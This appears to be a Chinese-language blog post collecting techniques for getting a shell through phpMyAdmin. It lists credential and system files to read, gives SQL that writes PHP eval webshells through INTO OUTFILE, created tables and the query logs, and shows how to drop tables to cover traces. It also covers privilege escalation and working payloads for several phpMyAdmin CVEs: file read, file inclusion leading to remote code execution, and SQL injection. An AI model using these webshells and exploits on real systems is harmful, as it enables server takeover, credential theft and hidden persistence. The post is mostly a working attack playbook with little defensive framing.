---
title: phpmyadmin 后台 getshell 及漏洞利用思路整理
date: 2020-11-21 22:24:22
categories:
- PHP
tags:
- phpmyadmin
- getshell
index_img: /img/phpmyadmin_index.png
banner_img: /img/phpmyadmin_banner.png
updated: 2021-03-17 12:00:00
toc: true
---


<!-- # phpmyadmin 后台 getshell 及漏洞利用思路整理 -->


## 0x01 信息收集思路

### 1. 网站绝对路径

#### 1.1 mysql路径

如果是类似phpstudy这样的集成工具，那么查询出mysql路径也就可以找到网站路径了。

```sql
select version();  -- 查看数据库版本
select @@datadir;  -- 查看数据库存储路径
show VARIABLES like '%char%';  -- 查看系统变量
show variables like '%plugin%'; -- 查看插件路径
```





#### 1.2 phpinfo()

可以直接显示web路径



#### 1.3 读取配置文件

如果注入点有文件读取权限，可通过 load_file 尝试读取配置文件

windows 敏感文件

```cmd
c:/boot.ini //查看系统版本 
c:/windows/php.ini //php配置信息 
c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 
c:/winnt/php.ini 
c:/winnt/my.ini 
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 
c:\Program Files\Serv-U\ServUDaemon.ini 
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 
c:\Program Files\RhinoSoft.com\ServUDaemon.exe 
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 
//存储了pcAnywhere的登陆密码 
c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 
c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. 
c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 
d:\APACHE\Apache2\conf\httpd.conf 
C:\Program Files\mysql\my.ini 
C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
```



linux 敏感文件

```cmd
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 
/usr/local/apache2/conf/httpd.conf 
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
/usr/local/app/php5/lib/php.ini //PHP相关设置 
/etc/sysconfig/iptables //从中得到防火墙规则策略 
/etc/httpd/conf/httpd.conf // apache配置文件 
/etc/rsyncd.conf //同步程序配置文件 
/etc/my.cnf //mysql的配置文件 
/etc/redhat-release //系统版本 
/etc/issue 
/etc/issue.net 
/usr/local/app/php5/lib/php.ini //PHP相关设置 
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
/etc/sysconfig/iptables 查看防火墙策略 
load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 
replace(load_file(0×2F6574632F706173737764),0×3c,0×20) 
replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
```

配置文件目录可以通过字典进行爆破。



#### 1.4 利用报错信息

如果网站开启了报错信息，通过报错信息很容易找到网站根路径。不仅仅是mysql报错信息。



#### 1.5 利用 `Google` 

```
site:xxx.com warning
site:xxx.com “fatal error”
```



#### 1.6 利用测试文件

```
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php
```

可以去寻找测试文件字典。



#### 1.7 访问一些特定的网页

下面一些网页可能会产生报错信息，从而可以得到网站根路径

```
phpMyAdmin/libraries/selectlang.lib.php
phpMyAdmin/darkblueorange/layout.inc.php
phpmyadmin/themes/darkblue_orange/layout.inc.php
phpMyAdmin/index.php?lang[]=1
phpMyAdmin/darkblueorange/layout.inc.php phpMyAdmin/index.php?lang[]=1
/phpmyadmin/libraries/lect_lang.lib.php
/phpMyAdmin/phpinfo.php
/phpmyadmin/themes/darkblue_orange/layout.inc.php
/phpmyadmin/libraries/select_lang.lib.php
/phpmyadmin/libraries/mcrypt.lib.php
```





### 2. 账户是否有读写权限

写入 `shell` 时遇到报错，可能是权限的原因

```sql
select * from mysql.user;                //查询所有用户权限
select * from mysql.user where user="root";        //查询root用户权限
update user set File_priv ='Y' where user = 'root';      //允许root用户读写文件
update user set File_priv ='N' where user = 'root';      //禁止root用户读写文件
flush privileges;                    //刷新MySQL系统权限相关表
```



### 3. 路径是否具有读写权限

#### 3.1 secure_file_priv 权限

```sql
select @@secure_file_priv;   -- 查询secure_file_priv
 -- secure_file_priv=NULL,禁止导入导出
 -- secure_file_priv='',不限制导入导出，Linux下默认/tmp目录可写
 -- secure_file_priv=/path/,只能向指定目录导入导出
```

> 在 `my.ini`、`my.cnf`、`mysqld.cnf` 文件中找到 `secure_file_prive` 并将其值设置为 ""或"/"，重启 MySQL 服务！

> 这是通用方法，在 `phpstudy` 中的 `mysql` 的配置文件中是没有这个参数的
>
> 所以我们自己在配置文件中添加一行 `secure_file_priv =` 即可。





#### 3.2 日志读写权限

查看日志状态：

```sql
show variables  like  '%general%';
show variables like '%slow%'; -- 慢查询日志
```

general 开启时，所执行的 `sql` 语句都会出现在 ***\****.log 文件。

```sql
SET GLOBAL general_log='on'
```

如果将general_log_file的值换成shell路径

```sql
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php'
```

然后执行简单的查询

```sql
select '<?php @eval($_POST["123"]);?>'
```

即可写入shell



## 0x02 后台写shell思路



### 1. 常规into outfile&into dumpfile

两者有所区别

> into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的
> into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll

写shell主要用outfile

**需要条件：**

- 当前的数据库用户有写权限
- 知道 web 绝对路径
- web 路径能写

```sql
select '<?php @eval($_POST[soap]);?>' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\
```

> 注意，如果是在 `phpmyadmin` 的 `sql` 语句中执行写入的话，路径只能是斜杠 / 或者双反斜杠 \\\\

目录不可写时可尝试其他可写的路径

```
/upload
/templates
/cache
写入中文路径 
```



写入中文路径 shell

```sh
set character_set_client='gbk';set character_set_connection='gbk';set character_set
```



### 2. 创建表 getshell

```sql
CREATE TABLE `mysql`.`xxxxx` (`content` TEXT NOT NULL );
INSERT INTO `mysql`.`xxxxx` (`content` ) VALUES ('<?php @eval($_POST[soap]);?>');
SELECT `content` FROM `mysql`.`xxxxx` INTO OUTFILE 'C:\\phpstudy\\PHPTutorial\\WWW\\test3.php';
或者
Create TABLE xxxxx (content text NOT NULL);
Insert INTO xxxxx (content) VALUES('<?php @eval($_POST[pass]);?>');
select `content` from mysql.xxxxx into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\test3.php';
然后删除所建的表抹去痕迹
DROP TABLE IF EXISTS `mysql`.`xxxxx`;
```



### 3. 日志 getshell

#### 3.1 general日志

查看日志状态：

```sql
show variables  like  '%general%';
```

general 开启时，所执行的 `sql` 语句都会出现在 ***\****.log 文件。

```sql
SET GLOBAL general_log='on'
```

如果将general_log_file的值换成shell路径

```sql
SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php'
```

然后执行简单的查询

```sql
select '<?php @eval($_POST["123"]);?>'
```

即可写入shell



#### 3.2 慢查询写 shell



```sql
show variables like '%slow%';
```



重新设置路径：

```sql
set GLOBAL slow_query_log_file='C:/phpstudy/PHPTutorial/WWW/slow.php';
```

开启慢查询日志：

```sql
set GLOBAL slow_query_log=on;
```

执行写入日志：

```sql
select '<?php eval($_POST["soap"]);?>' from mysql.db where sleep(10);
```

![image-20210321161304678](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png)



### 4. 低权限读user.MYD提权

读user.MYD的目的是为了能够提取到root用户的hash，通过破解即可使用root用户登录，进而提权。

首先需要定位user.MYD文件路径，我们可以先查询mysql路径。

```sql
select @@basedir;
```

user.MYD文件存储在@@basedir\data\mysql\user.MYD

依次执行

```sql
create table ttt(ddd text);
load data local infile 'C:\\phpStudy\\MySQL\\data\\mysql\\user.MYD' into table ttt fields terminated by '' LINES TERMINATED BY '\0';
select * from ttt;
```

但是读取的不全，phpmyadmin中没法正常显示。

渗透测试场景中，如果能够导出user.MYD文件，就可以进行hash 的获取。

具体可以参考

[获取MySQL中user.MYD中hash技巧](http://www.dengb.com/wzaq/1017388.html)







### 5. UDF提权

**条件**：

- 具有写权限
- 插件目录可写（或者可以更改指定的插件目录）

具体情况要看目标 mysql 的版本：

- Mysql version > 5.1 时，dll 或者 so 必须位于 mysql 安装目录 libplugin 下，当对该目录具有写权限时可以利用，查看：
  `show variables like %plugin%;`// 查看插件目录
- 5.0 <= Mysql version <5.1 时，需要导出至目标服务器的系统目录，如 C://Windows/System32
- Mysql version < 5.0 时，目录可以自定义具体利用如下：



具体流程可以参考：[MYSQL写shell与提权](https://coomrade.github.io/2018/09/12/MYSQL%E5%86%99shell%E4%B8%8E%E6%8F%90%E6%9D%83/)





### 6. MOF 提权

通过 `mysql` 将文件写入一个 `MOF` 文件替换掉原有的 `MOF` 文件，然后系统每隔五秒就会执行一次上传的 `MOF`。

一般适用于 `Windows <= 2003`，并且 `C:\Windows\System32\mof` 目录具有写权限（一般是没有权限写）。

可以使用 `MSF` 直接利用：`exploit/windows/mysql/mysql_mof`



## 0x03 可利用漏洞





### CVE-2013-3238

影响版本：3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG
利用模块：exploit/multi/http/phpmyadminpregreplace

### CVE-2012-5159

影响版本：phpMyAdmin v3.5.2.2
利用模块：exploit/multi/http/phpmyadmin3522_backdoor

### CVE-2009-1151

PhpMyAdmin配置文件/config/config.inc.php存在命令执行
影响版本：2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
利用模块：exploit/unix/webapp/phpmyadmin_config
弱口令&万能密码
弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码



### 低版本万能密码

版本2.11.3 / 2.11.4，用户名'localhost'@'@"则登录成功





### `WooYun-2016-199433`：任意文件读取漏洞

影响 phpMyAdmin`2.x` 版本

```http
POST /scripts/setup.php HTTP/1.1 
Host: your-ip:8080
Accept-Encoding: gzip, deflate Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded Content-Length: 80
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```





### CVE-2014 -8959：本地文件包含

影响范围：`phpMyAdmin 4 .0.1--4 .2.12`，需要 `PHP version < 5.3.4`

```http
/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=
/../../../../phpinfo.txt%00    # 注意改下token值
```

在实际利用中可以利用写入文件到 `/tmp` 目录下结合此漏洞完成 `RCE`.



### CVE-2016-5734 ：后台 RCE

影响范围：PhpMyAdmin`4 .0.x-4 .6.2`，需要 `PHP 4.3.0-5.4.6 versions`

```python
cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
```

poc地址：https://www.exploit-db.com/exploits/40185



### CVE-2018-12613：后台文件包含

`phpMyAdmin 4.8.0` 和 `4.8.1`，经过验证可实现任意文件包含。

漏洞验证：

```
http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

rce利用：包含session文件

执行 `SQL` 语句，将 `PHP` 代码写入 `Session` 文件中：

```sql
select '<?php phpinfo();exit;?>'
```

包含 `session` 文件：

```url
http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_*** # *** 为phpMyAdmin的COOKIE值
```









### CVE-2018-19968：任意文件包含/RCE

phpMyAdmin 4.8.0~4.8.3，利用如下：

创建数据库，并将 `PHP` 代码写入 `Session` 文件中:

```sql
CREATE DATABASE foo;
CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
```

生成 `foo` 数据库的 `phpMyAdmin` 的配置表，访问：

```
http://10.1.1.10/chk_rel.php?fixall_pmadb=1&db=foo
```

篡改数据插入 `pma column_info` 中：

```sql
INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_***','plop'; # *** 为phpMyAdmin 的COOKIE值
```

这里要注意不用系统的 `session` 保存位置不同，具体系统可以在 `phpMyAdmin` 登录后首页看到

- MacOS`：`/var/tmp
- Linux`：`/var/lib/php/sessions
- phpStudy`：`/phpstudy/PHPTutorial/tmp/tmp



访问包含 `Session` 文件的地址：

```sql
/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1
```


### CVE-2020-0554 后台SQL注入

报错注入

```sql
http://192.168.209.139:8001/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server
```







## 参考资料

- [phpmyadmin 后台 getshell 及漏洞利用](https://xxxxx.com/sec/496.html#menu_index_3)

- [Mysql 在渗透测试中的利用](https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#1-win-%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%9A)

- [利用phpmyadmin getshell(非实战，在本地环境下进行)](https://blog.csdn.net/weixin_43940853/article/details/104527925)

- [获取MySQL中user.MYD中hash技巧](http://www.dengb.com/wzaq/1017388.html)

- [vulhub](https://github.com/vulhub/vulhub)

- [phpMyAdmin后台SQL注入(CVE-2020-0554)](https://zhuanlan.zhihu.com/p/138266875)


